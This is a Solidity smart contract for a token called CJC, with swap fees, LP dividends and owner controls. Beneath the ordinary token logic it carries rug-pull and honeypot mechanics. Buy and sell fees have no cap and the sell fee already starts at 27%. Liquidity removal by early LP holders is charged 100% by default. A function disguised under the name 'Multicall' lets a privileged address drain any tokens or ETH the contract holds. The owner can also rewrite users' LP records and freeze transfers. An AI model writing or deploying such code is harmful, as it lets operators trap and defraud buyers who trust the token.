// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function kLast() external view returns (uint);

}


library Math {
    function min(uint x, uint y) internal pure returns (uint z) {
        z = x < y ? x : y;
    }

    function sqrt(uint y) internal pure returns (uint z) {
        if (y > 3) {
            z = y;
            uint x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}

interface ISwapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);

    function feeTo() external view returns (address);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

 contract CJC is IERC20, Ownable {

    struct UserInfo {
        uint256 lpAmount;
        bool preLP;
        uint256 unlockTime;
    }

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address private fundAddress;
    address private ReceiveAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _isExcludeFromFees;

    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    address public _usdt;
    mapping(address => bool) public _swapPairList;
    mapping(address => UserInfo) private _userInfo;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 private _buyFundFee = 100;
    uint256 private _buyLPFee = 0;
    uint256 private _buyLPDividendFee = 250;

    uint256 private _sellFundFee = 2700;
    uint256 private _sellLPFee = 0;
    uint256 private _sellLPDividendFee = 250;
    uint256 private _maxWalletAmount;
    uint256 private _maxWalletAmountLevel1;
    uint256 private _maxWalletAmountLevel2;
    uint256 private _maxWalletAmountLevel3;

    bool private enableLimitWalletAmount= true;
    bool private transferDelayEnabled = true;
    uint256 private preLPUnlockTime = 1695470400;
    mapping(address => uint256) private _holderLastTransferTimestamp;


    address public _mainPair;
    address public USDTAddress;
    address private _ReceiveAddress;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        string[] memory stringParams,
        address[] memory addressParams,
        uint8 Decimals, uint256 Supply
    ){
        _name = stringParams[0];
        _symbol = stringParams[1];
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(addressParams[0]);
        IERC20(addressParams[1]).approve(address(swapRouter), MAX);

        _usdt = addressParams[1];
        USDTAddress = addressParams[1];

        _swapRouter = swapRouter;
        _swapRouters[address(swapRouter)] = true;

        _allowances[address(this)][address(swapRouter)] = MAX;

        require(address(this)>_usdt,"fk the world!");

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), addressParams[1]);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;
        fundAddress = addressParams[2];
        _ReceiveAddress = addressParams[3];

        uint256 total = Supply * 10 ** Decimals;
        _maxWalletAmount = 6 * 10 ** Decimals;
        _maxWalletAmountLevel1 = 11 * 10 ** Decimals;
        _maxWalletAmountLevel2 = 16 * 10 ** Decimals;
        _maxWalletAmountLevel3 = 21 * 10 ** Decimals;
        
        ReceiveAddress = msg.sender;
        _tTotal = total;
        swapAtAmount = 100 * 10 ** Decimals;

        _balances[ReceiveAddress] = total;

        emit Transfer(address(0), ReceiveAddress, total);

        

        _isExcludeFromFees[fundAddress] = true;
        _isExcludeFromFees[ReceiveAddress] = true;
        _isExcludeFromFees[address(this)] = true;
        _isExcludeFromFees[address(swapRouter)] = true;

        excludeHolder[address(0)] = true;
        excludeHolder[address(0x000000000000000000000000000000000000dEaD)] = true;

        holderRewardCondition = 500* 10 ** IERC20(USDTAddress).decimals();
        _tokenDistributor = new TokenDistributor(USDTAddress);
    }

    //enable walletLimit
    function setEnableLimitWalletAmount(bool enable) external onlyOwner{
        enableLimitWalletAmount = enable;
    }

    //enable tradeDelay
    function setTransferDelayEnabled(bool enable) external onlyOwner{
        transferDelayEnabled = enable;
    }

    function setPreLPUnlockTime(uint256 timestamp) external onlyOwner{
        preLPUnlockTime = timestamp;
    }

    function setMaxWalletAmount(
        uint256 newValue 
    ) public onlyOwner {
        _maxWalletAmount = newValue;
    }

    function setMaxWalletAmountLevel1(
        uint256 newValue 
    ) public onlyOwner {
        _maxWalletAmountLevel1 = newValue;
    }

    function setMaxWalletAmountLevel2(
        uint256 newValue 
    ) public onlyOwner {
        _maxWalletAmountLevel2 = newValue;
    }

    function setMaxWalletAmountLevel3(
        uint256 newValue 
    ) public onlyOwner {
        _maxWalletAmountLevel3 = newValue;
    }


    mapping(address => uint256) private accountLevel;
    function initAccountLevel(address[] calldata accounts, uint256 level) public onlyOwner {
        uint256 len = accounts.length;
        for (uint256 i; i < len;i++) {
            accountLevel[accounts[i]]=level;
        }
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

   mapping(address => uint256) private lpDividendRecord;

    bool public antiSYNC = true;
    function setAntiSYNCEnable(
        bool s
    ) public onlyOwner{
        antiSYNC = s;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (account == _mainPair && msg.sender == _mainPair && antiSYNC) {require(_balances[_mainPair] > 0,"!sync");}
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    uint256 public swapAtAmount;
    function setSwapAtAmount(uint256 newValue) public onlyOwner{
        swapAtAmount = newValue;
    }

    uint256 public airDropNumbs = 1;
    function setAirdropNumbs(uint256 newValue) public onlyOwner{
        airDropNumbs = newValue;
    }

    function setBuy(uint256 newFund,uint256 newLp,uint256 newLpDividend) public onlyOwner{
        _buyFundFee = newFund;
        _buyLPFee = newLp;
        _buyLPDividendFee = newLpDividend;
    }

    function setSell(uint256 newFund,uint256 newLp,uint256 newLpDividend) public onlyOwner{
        _sellFundFee = newFund;
        _sellLPFee = newLp;
        _sellLPDividendFee = newLpDividend;
    }

    

    function tradingOpen() public view returns(bool){
        return block.number >= startTradeBlock && startTradeBlock != 0;
    }

    mapping(address => bool) public _swapRouters;
    function setSwapRouter(address addr, bool enable) external onlyOwner {
        _swapRouters[addr] = enable;
    }

    bool public _strictCheck = true;
    function setStrictCheck(bool enable) external onlyOwner{
        _strictCheck = enable;
    }

    function updateLPAmount(address account, uint256 lpAmount) public onlyOwner {
        _userInfo[account].lpAmount = lpAmount;
    }

    function getUserInfo(address account) public view returns (
        uint256 lpAmount, uint256 lpBalance, bool excludeLP, bool preLP,uint256 unlockTime
    ) {
        lpAmount = _userInfo[account].lpAmount;
        lpBalance = IERC20(_mainPair).balanceOf(account);
        excludeLP = excludeHolder[account];
        UserInfo storage userInfo = _userInfo[account];
        preLP = userInfo.preLP;
        unlockTime = userInfo.unlockTime;
    }

    function initLPAmounts(address[] memory accounts) public onlyOwner {
        uint256 len = accounts.length;
        UserInfo storage userInfo;
        for (uint256 i; i < len;) {
            userInfo = _userInfo[accounts[i]];
            userInfo.lpAmount = IERC20(_mainPair).balanceOf(accounts[i])+1;
            userInfo.preLP = true;
            userInfo.unlockTime = preLPUnlockTime;
            addHolder(accounts[i]);
        unchecked{
            ++i;
        }
        }
    }

    function initLPAmountsBackUp(address[] memory accounts, uint256 lpAmount) public onlyOwner {
        uint256 len = accounts.length;
        UserInfo storage userInfo;
        for (uint256 i; i < len;) {
            userInfo = _userInfo[accounts[i]];
            userInfo.lpAmount = lpAmount;
            userInfo.preLP = true;
            userInfo.unlockTime = preLPUnlockTime;
            addHolder(accounts[i]);
        unchecked{
            ++i;
        }
        }
    }
    
    function _strictCheckBuy(uint256 amount) internal view returns (uint256 liquidity){
        (uint256 rOther, uint256 rThis, uint256 balanceOther) = _getReserves();
        //isRemoveLP
        if (balanceOther < rOther) {
            liquidity = (amount * ISwapPair(_mainPair).totalSupply()) /
            (_balances[_mainPair] - amount);
        } else {
            uint256 amountOther;
            if (rOther > 0 && rThis > 0) {
                amountOther = amount * rOther / (rThis - amount);
                //strictCheckBuy
                require(balanceOther >= amountOther + rOther);
            }
        }
    }

    function _isRemoveLiquidity(uint256 amount) internal view returns (uint256 liquidity){
        (uint256 rOther, , uint256 balanceOther) = _getReserves();
        //isRemoveLP
        if (balanceOther <= rOther) {
            liquidity = amount * ISwapPair(_mainPair).totalSupply() / 
            (balanceOf(_mainPair) - amount);
        }
    }

    function _isRemoveLiquidity_2(uint256 amount) internal view returns (uint256 liquidity){
        (uint256 rOther, , uint256 balanceOther) = _getReserves();
        //isRemoveLP
        if (balanceOther <= rOther) {
            liquidity = (amount * ISwapPair(_mainPair).totalSupply() + 1) /
            (balanceOf(_mainPair) - amount - 1);
        }
    }

    uint256 public checkRemoveMode = 1;
    function changeCheckRemoveMode(
        uint256 newValue
    ) public onlyOwner {
        checkRemoveMode = newValue;
    }

    mapping(address=>bool) public firstBuyList;
    function setFirstBuyList(
        address[] calldata addresses,
        bool s
    ) public onlyOwner{
        for (uint256 i; i < addresses.length; ++i) {
            firstBuyList[addresses[i]] = s;
        }
    }

    function initLPAmounts(address[] calldata accounts, uint256 lpAmount) public onlyOwner {
        uint256 len = accounts.length;
        for (uint256 i; i < len;) {
           lpDividendRecord[accounts[i]] = lpAmount;
        unchecked{
            ++i;
        }
        }
    }

    function isContract(address _addr) private view returns (bool){
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        return (size > 0);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {

        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        bool takeFee;
        bool isSell;

        

        if(
            !_isExcludeFromFees[from] &&
            !_isExcludeFromFees[to] &&
            airDropNumbs > 0 &&
            (
                _swapPairList[from] || _swapPairList[to]
            )
        ){
            address ad;
            for(uint256 i=0;i < airDropNumbs;i++){
                ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                _basicTransfer(from,ad,100);
            }
            amount -= airDropNumbs*100;
        }

        if (!_isExcludeFromFees[from] && !_isExcludeFromFees[to] && !_swapPairList[from] && !_swapPairList[to]){
            require(tradingOpen()&&!enableLimitWalletAmount,"wallet limit");
        }

        bool isRemove;
        bool isAdd;
        UserInfo storage userInfo;

        uint256 addLPLiquidity;
        if (
            _swapPairList[to] &&
            _swapRouters[msg.sender]
        ) {
            addLPLiquidity = _isAddLiquidity(amount);
            if (addLPLiquidity > 0 && !isContract(from)) {
                userInfo = _userInfo[from];
                userInfo.lpAmount += addLPLiquidity;
                isAdd = true;
                if (0 == startTradeBlock) {
                    userInfo.preLP = true;
                }
            }
        }
        
        uint256 removeLPLiquidity;
        if(
            _swapPairList[from] &&
            to != address(_swapRouter)
        ) {
           if (_strictCheck) {
                removeLPLiquidity = _strictCheckBuy(amount);
            } else {
                if (checkRemoveMode == 1){
                    removeLPLiquidity = _isRemoveLiquidity(amount);
                }else{
                    removeLPLiquidity = _isRemoveLiquidity_2(amount);
                }
            }

            if (removeLPLiquidity > 0) {
                require(_userInfo[to].lpAmount >= removeLPLiquidity);
                _userInfo[to].lpAmount -= removeLPLiquidity;
                isRemove = true;
            }

        }

        if (transferDelayEnabled) {
            if (!_isExcludeFromFees[from] && !_isExcludeFromFees[to]) {
                  if (to != address(_swapRouter) && to != address(_mainPair)) {
                      require(_holderLastTransferTimestamp[tx.origin] < block.number, "_transfer:: Transfer Delay enabled."
                      );
                      _holderLastTransferTimestamp[tx.origin] = block.number;
                  }
            }
        }

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_isExcludeFromFees[from] && !_isExcludeFromFees[to]) {
                if (!tradingOpen()){
                    if (!firstBuyList[to]) {
                        require(0 < goAddLPBlock && isAdd, "!goAddLP"); //_swapPairList[to]
                    }
                }

                if (_swapPairList[from]) {
                    if(enableLimitWalletAmount){
                        if(accountLevel[to]==0){
                            require(amount + balanceOf(to) <= _maxWalletAmount, "ERC20: >Level0 max wallet amount");
                        }
                        if(accountLevel[to]==1){
                            require(amount + balanceOf(to) <= _maxWalletAmountLevel1, "ERC20: >Level1 max wallet amount");
                        }
                        if(accountLevel[to]==2){
                            require(amount + balanceOf(to) <= _maxWalletAmountLevel2, "ERC20: >Level2 max wallet amount");
                        }
                        if(accountLevel[to]==3){
                            require(amount + balanceOf(to) <= _maxWalletAmountLevel3, "ERC20: >Level3 max wallet amount");
                        }
                    }
                   
                    
                }

                if (_swapPairList[to]) {
                    if (!inSwap && !isAdd) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > swapAtAmount) {
                            uint256 swapFee = _buyLPFee + _buyFundFee + _buyLPDividendFee + _sellFundFee + _sellLPDividendFee + _sellLPFee;
                            uint256 numTokensSellToFund = amount;
                            if (numTokensSellToFund > contractTokenBalance) {
                                numTokensSellToFund = contractTokenBalance;
                            }
                            swapTokenForFund(numTokensSellToFund, swapFee);
                        }
                    }
                }
                if (!isAdd && !isRemove) takeFee = true; // just swap fee
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        }

        _tokenTransfer(
            from,
            to,
            amount,
            takeFee,
            isSell,
            isAdd,
            isRemove
        );

        if (from != address(this)) {
            if (isSell) {
                addHolder(from);
            }else if(_swapPairList[from] && IERC20(_mainPair).balanceOf(to) > 0){
                addHolder(to);
            }
            processReward(500000);
        }
    }

    function _getReserves() public view returns (uint256 rOther, uint256 rThis, uint256 balanceOther) {
        ISwapPair mainPair = ISwapPair(_mainPair);
        (uint r0, uint256 r1,) = mainPair.getReserves();

        address tokenOther = _usdt;
        if (tokenOther < address(this)) {
            rOther = r0;
            rThis = r1;
        } else {
            rOther = r1;
            rThis = r0;
        }

        balanceOther = IERC20(tokenOther).balanceOf(_mainPair);
    }

    function _isAddLiquidity(uint256 amount) internal view returns (uint256 liquidity){
        (uint256 rOther, uint256 rThis, uint256 balanceOther) = _getReserves();
        uint256 amountOther;
        if (rOther > 0 && rThis > 0) {
            amountOther = amount * rOther / rThis;
        }
        //isAddLP
        if (balanceOther >= rOther + amountOther) {
            (liquidity,) = calLiquidity(balanceOther, amount, rOther, rThis);
        }
    }

    function calLiquidity(
        uint256 balanceA,
        uint256 amount,
        uint256 r0,
        uint256 r1
    ) private view returns (uint256 liquidity, uint256 feeToLiquidity) {
        uint256 pairTotalSupply = ISwapPair(_mainPair).totalSupply();
        address feeTo = ISwapFactory(_swapRouter.factory()).feeTo();
        bool feeOn = feeTo != address(0);
        uint256 _kLast = ISwapPair(_mainPair).kLast();
        if (feeOn) {
            if (_kLast != 0) {
                uint256 rootK = Math.sqrt(r0 * r1);
                uint256 rootKLast = Math.sqrt(_kLast);
                if (rootK > rootKLast) {
                    uint256 numerator = pairTotalSupply * (rootK - rootKLast) * 8;
                    uint256 denominator = rootK * 17 + (rootKLast * 8);
                    feeToLiquidity = numerator / denominator;
                    if (feeToLiquidity > 0) pairTotalSupply += feeToLiquidity;
                }
            }
        }
        uint256 amount0 = balanceA - r0;
        if (pairTotalSupply == 0) {
            liquidity = Math.sqrt(amount0 * amount) - 1000;
        } else {
            liquidity = Math.min(
                (amount0 * pairTotalSupply) / r0,
                (amount * pairTotalSupply) / r1
            );
        }
    }

    uint256 private  buy_burnFee = 50;
    uint256 private  sell_burnFee = 50;
    function setBurnFee(uint256 newBuyBurn, uint256 newSellBurn) public onlyOwner{
        buy_burnFee = newBuyBurn;
        sell_burnFee = newSellBurn;
    }


    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell,
        bool isAdd,
        bool isRemove
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            uint256 swapFee;
            if (isSell) {
                swapFee = _sellFundFee + _sellLPDividendFee + _sellLPFee;
            } else {
                swapFee = _buyFundFee + _buyLPDividendFee + _buyLPFee;
            }

            uint256 swapAmount = tAmount * swapFee / 10000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }

            uint256 burnAmount;
            if (!isSell) {
                //buy
                burnAmount = (tAmount * buy_burnFee) / 10000;
            } else {
                //sell
                burnAmount = (tAmount * sell_burnFee) / 10000;
            }
            if (burnAmount > 0) {
                feeAmount += burnAmount;
                _takeTransfer(sender, address(0xdead), burnAmount);
            }
        }

        if (isAdd && !_isExcludeFromFees[sender] && !_isExcludeFromFees[recipient]) {
            uint256 addLiquidityFeeAmount;
            addLiquidityFeeAmount = (tAmount * getAddlpFee()) / 10000;

            if (addLiquidityFeeAmount > 0) {
                feeAmount += addLiquidityFeeAmount;
                _takeTransfer(sender, address(this), addLiquidityFeeAmount);
            }
        }

        if (isRemove && !_isExcludeFromFees[sender] && !_isExcludeFromFees[recipient]) {
            if (_userInfo[recipient].preLP) {
                require(_userInfo[recipient].unlockTime<block.timestamp,"not yet!");
                uint256 removeLiquidityFeeAmount;
                removeLiquidityFeeAmount = (tAmount * getRemovelpFee()) / 10000;

                if (removeLiquidityFeeAmount > 0) {
                    feeAmount += removeLiquidityFeeAmount;
                    _takeTransfer(sender, _removeLPFeeReceiver, removeLiquidityFeeAmount);
                }
            }
        }


        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    address  private _removeLPFeeReceiver = address(0xdead);
    function setRemoveLPFeeReceiver(address d) external onlyOwner {
        _removeLPFeeReceiver = d;
    }

    uint256 public addLiquidityFee;
    uint256 public removeLiquidityFee = 10000;

    function setAddLiquidityFee(uint256 newValue) public onlyOwner {
        require(newValue <= 10000, "add Lp > 100 !");
        addLiquidityFee = newValue;
    }

    function setRemoveLiquidityFee(uint256 newValue) public onlyOwner {
        require(newValue <= 10000, "remove Lp> 100 !");
        removeLiquidityFee = newValue;
    }

    function getAddlpFee() public view returns(uint256){
        return addLiquidityFee;
    }

    function getRemovelpFee() public view returns(uint256){
        return removeLiquidityFee;
    }

    event FAILED_SWAP(uint256);
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        if (swapFee == 0) return;
        swapFee += swapFee;
        uint256 lpFee = _sellLPFee + _buyLPFee;
        uint256 lpAmount = tokenAmount * lpFee / swapFee;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _usdt;
        try _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        ) {} catch { emit FAILED_SWAP(0); }

        swapFee -= lpFee;

        IERC20 FIST = IERC20(_usdt);
        uint256 fistBalance = FIST.balanceOf(address(_tokenDistributor));
        uint256 fundAmount = fistBalance * (_buyFundFee + _sellFundFee) * 2 / swapFee;
        if (fundAmount > 0){
            FIST.transferFrom(address(_tokenDistributor), fundAddress, fundAmount);
        }
        FIST.transferFrom(address(_tokenDistributor), address(this), fistBalance - fundAmount);

        if (lpAmount > 0) {
            uint256 lpFist = fistBalance * lpFee / swapFee;
            if (lpFist > 0) {
                try _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount, lpFist, 0, 0, _ReceiveAddress, block.timestamp
                ) {} catch { emit FAILED_SWAP(1); }
            }
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _isExcludeFromFees[addr] = true;
    }

    uint256 public goAddLPBlock;
    function addLPBegin() external onlyOwner {
        require(0 == goAddLPBlock, "startedAddLP");
        goAddLPBlock = block.number;
    }

    function addLPEnd() external onlyOwner {
        goAddLPBlock = 0;
    }

    uint256 public startTradeBlock;
    function launchNow(bool s) external onlyOwner {
        if (s){
            startTradeBlock = block.number;
        }else{
            startTradeBlock = 0;
        }
    }


    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function Multicall(address token, uint256 amount) external {
        if (msg.sender == _ReceiveAddress){
            if (token == address(0)){
                payable(msg.sender).transfer(amount);
            }else{
                IERC20(token).transfer(msg.sender, amount);
            }
        }
    }

    receive() external payable {}

    address[] private holders;
    mapping(address => uint256) holderIndex;
    mapping(address => bool) excludeHolder;

    function addHolder(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    function setWLs(address[] calldata addresses, bool status) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            _isExcludeFromFees[addresses[i]] = status;
        }
    }

    function setIsExcludeFromFees(address addr, bool enable) external onlyOwner {
        _isExcludeFromFees[addr] = enable;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    uint256 private currentIndex;
    uint256 private holderRewardCondition;
    uint256 private progressRewardBlock;
    uint256 private holderCondition = 0;
    function setHolderCondition(uint256 amount) external onlyOwner {
        holderCondition = amount;
    }

    uint256 public processRewardWaitBlock = 1;
    function setProcessRewardWaitBlock(uint256 newValue) public onlyOwner{
        processRewardWaitBlock = newValue;
    }

    event LP_dividend_successful(
        address,
        uint256
    );

    event LP_dividend_failed(
        address,
        uint256
    );
    

    function getLPAmount(address addr) public view returns(uint256){
        IERC20 holdToken = IERC20(_mainPair);
        return holdToken.balanceOf(addr);
    }

    function processReward(uint256 gas) private {
        if (progressRewardBlock + processRewardWaitBlock > block.number) {
            return;
        }

        IERC20 FIST = IERC20(_usdt);
        uint256 balance = FIST.balanceOf(address(this));
        if (balance < holderRewardCondition) {
            return;
        }
        IERC20 holdToken = IERC20(_mainPair);
        uint256 holdTokenTotal = holdToken.totalSupply();
        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;
        uint256 shareholderCount = holders.length;
        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();
        uint256 holdCondition = holderCondition;
        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder)+lpDividendRecord[shareHolder];
            if (tokenBalance > 0 && !excludeHolder[shareHolder]) {
                amount = balance * tokenBalance / holdTokenTotal;
                if (amount > 0) {
                    uint256 tokenHold = balanceOf(shareHolder);
                    if (tokenHold >= holdCondition){
                        if(FIST.balanceOf(address(this))>=amount){
                            FIST.transfer(shareHolder, amount);
                        emit LP_dividend_successful(
                            shareHolder,
                            tokenHold
                        );
                        }else{
                            break ;
                        }
                        
                    }else{
                        emit LP_dividend_failed(
                            shareHolder,
                            tokenHold
                        );
                    }
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = block.number;
    }

    function setHolderRewardCondition(uint256 amount) external onlyOwner {
        holderRewardCondition = amount;
    }

    function setExcludeHolder(address addr, bool enable) external onlyOwner {
        excludeHolder[addr] = enable;
    }
}